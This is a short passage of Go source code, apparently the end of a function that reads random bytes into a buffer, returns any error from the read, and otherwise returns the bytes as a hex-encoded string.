	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}
